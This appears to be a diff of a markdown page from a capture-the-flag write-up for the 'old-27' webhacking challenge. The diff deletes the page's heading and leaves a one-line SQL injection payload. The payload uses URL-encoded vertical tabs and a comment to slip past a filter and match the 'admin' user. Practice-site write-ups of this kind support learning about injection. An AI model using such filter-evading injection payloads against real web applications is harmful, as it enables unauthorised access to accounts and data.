@@ -3,7 +3,7 @@ layout: default
 title: old-27
 ---
 
-# Webhacking old-27 Solution
+
 
 we will insert this payload:
 `0)||id%0blike%0b%27admin%27--%0b`
